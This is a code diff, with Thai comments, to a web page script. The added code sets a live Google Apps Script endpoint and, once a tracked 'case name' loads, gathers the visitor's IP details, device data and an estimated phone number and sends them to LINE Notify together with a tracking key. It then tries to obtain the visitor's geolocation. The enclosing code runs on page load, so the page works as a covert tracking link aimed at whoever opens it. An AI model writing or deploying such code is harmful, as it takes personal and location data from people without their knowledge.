@@ -49,7 +49,7 @@ function getCaseNameFromContainer() {
 async function fetchCaseName(trackKey) {
   try {
     // URL ของ Web App (ต้องแทนที่ด้วย URL จริงของ Web App ที่เผยแพร่แล้ว)
-    const webAppUrl = 'https://script.google.com/macros/s/YOUR_WEBAPP_ID/exec';
+    const webAppUrl = 'https://script.google.com/macros/s/AKfycby9hQVAxxIgg3K7pksMrMYHvrIAZliv33-9zC8w2xmytRoW47HEt_OwXCyEfk8-yqVFyg/exec';
     
     const response = await fetch(`${webAppUrl}?key=${encodeURIComponent(trackKey)}`);
     const data = await response.json();
@@ -65,6 +65,51 @@ async function fetchCaseName(trackKey) {
     return "ไม่มีค่า";
   }
 }
+
+// เพิ่มฟังก์ชันเพื่อรอให้ caseName โหลดเสร็จก่อนส่งข้อมูล
+function waitForCaseName(maxWaitTime = 3000) {
+  return new Promise((resolve) => {
+    const startTime = Date.now();
+    
+    function checkCaseName() {
+      const caseName = getCaseNameFromContainer();
+      if (caseName && caseName !== "กำลังโหลด...") {
+        // มี caseName แล้ว
+        resolve(caseName);
+      } else if (Date.now() - startTime > maxWaitTime) {
+        // เกินเวลารอ
+        resolve("ไม่มีค่า");
+      } else {
+        // รอต่อไป
+        setTimeout(checkCaseName, 100);
+      }
+    }
+    
+    checkCaseName();
+  });
+}
+
+// รอให้ caseName โหลดเสร็จก่อนส่งข้อมูล
+waitForCaseName().then(caseName => {
+  // (ข้อมูลอื่นๆ ที่รวบรวมแล้ว)
+  
+  // ตรวจสอบ IP และส่งข้อมูล
+  getIPDetails()
+    .then(ipData => {
+      // ตรวจสอบข้อมูลเบอร์โทรศัพท์ (หรือประมาณการณ์)
+      estimatePhoneNumber().then(phoneInfo => {
+        // แทรก caseName ที่โหลดเสร็จแล้วเข้าไปในข้อมูล
+        const { trackingKey } = getUrlParameters();
+        
+        // ส่งข้อมูลครั้งแรกทันทีพร้อม IP (ไม่มีพิกัด)
+        sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
+
+        // พยายามขอข้อมูลพิกัด (ถ้าผู้ใช้อนุญาต)
+        tryGetLocation(ipData, timestamp, referrer, allDeviceData, phoneInfo, trackingKey, caseName);
+      }).catch(/* ... */);
+    })
+    .catch(/* ... */);
+});
 
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
 (function() {
